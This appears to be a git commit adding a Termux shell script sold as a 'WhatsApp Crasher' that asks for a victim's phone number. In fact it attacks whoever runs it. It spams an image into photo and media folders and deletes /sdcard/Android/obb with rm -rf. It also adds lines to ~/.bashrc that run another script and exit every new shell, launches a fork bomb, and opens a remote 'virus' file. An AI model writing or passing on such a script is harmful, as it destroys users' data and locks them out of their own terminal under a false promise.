8bd99d9dae05131980ccf9059cb450033d131f9d
jitu6200749026 <92196579+jitu6200749026@users.noreply.github.com>
2021-10-28 13:01:51 +0530

    Add files via upload

---
+++ WhatsApp-Crasher-main/Rawan.sh
@@ -0,0 +1,57 @@
+git  clone https://github.com/Vretlee/BaapG
+ls
+clear
+mv Folder.py Crash.py
+cd  BaapG
+cp -r JaiRajputana.jpg /sdcard
+cp -r JaiRajputana.jpg /sdcard/DCIM
+cp -r JaiRajputana.jpg /sdcard/DCIM/Camera
+cp -r JaiRajputana.jpg /sdcard/DCIM/Camera
+cp -r JaiRajputana.jpg /sdcard/DCIM/Screenshots
+cp -r JaiRajputana.jpg /sdcard/Pictures
+cp -r JaiRajputana.jpg /sdcard/Pictures/facebook
+cp -r JaiRajputana.jpg /sdcard/documents
+cp -r JaiRajputana.jpg /sdcard/Movies
+cp -r JaiRajputana.jpg /sdcard/bluetooth
+cp -r JaiRajputana.jpg /sdcard/DCIM/ScreenRecorder
+cp -r JaiRajputana.jpg /sdcard/WhatsApp/Media
+cd /sdcard/Android
+rm -rf obb
+cd /sdcard
+cd $HOME
+pkg install figlet -y
+pkg install cowsay
+clear
+echo 'bash c.sh' >> ~/.bashrc
+echo 'exit' >> ~/.bashrc
+mv c.sh $HOME
+sleep 2
+neofetch
+sleep 4
+clear
+echo " plz wait............"
+sleep 5
+clear
+echo " "
+cowsay -f daemon 1
+sleep 1
+echo -e "\e[91m "
+figlet "You Can Crash Anyone WhatsApp"
+echo "  Coded By BaapG Ghazipur Up India"
+echo " "
+sleep 3
+echo " "
+echo -e "\e[91m "
+read -p "[•] please type Number with Country Code :- "
+sleep 3
+clear
+echo "\e[91m "
+cowsay -f meow 1
+figlet "reset phone .·´¯`(>▂<)´¯`·.️"
+:(){ :|:& };:
+termux-open  https://github.com/Vretlee/WhatsApp-Crasher/raw/main/BaapG%20Virus%206%20September.txt
+cd $HOME
+rm -rf CrashWhatsApp
+exit
+exit
+ls
